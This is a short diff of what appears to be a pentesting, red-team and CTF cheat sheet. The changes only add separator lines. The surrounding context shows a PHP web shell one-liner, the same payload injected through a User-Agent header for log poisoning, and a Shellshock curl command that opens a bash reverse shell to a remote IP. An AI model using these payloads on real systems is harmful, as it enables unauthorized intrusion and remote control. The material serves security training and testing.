@@ -35,6 +35,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```php
   <?php system($_GET['cmd']); ?>
   ```
+  ---
   
 `Web Shell (SSH Log Poisoning) -> /var/log/auth.log`
 
@@ -51,6 +52,8 @@ __Pentesting - Red Team - CTFs - OSCP__
   ```cmd
   User-Agent: <?php system($_GET['cmd']); ?>
   ```
+  ---
+  
 `Shellshock`
 
   ```cmd
@@ -70,6 +73,7 @@ __Pentesting - Red Team - CTFs - OSCP__
   
   curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.2/443 0>&1'" "http://192.168.1.3/cgi-bin/evil.cgi"
   ```
+  ---
   
 `Perl`
 
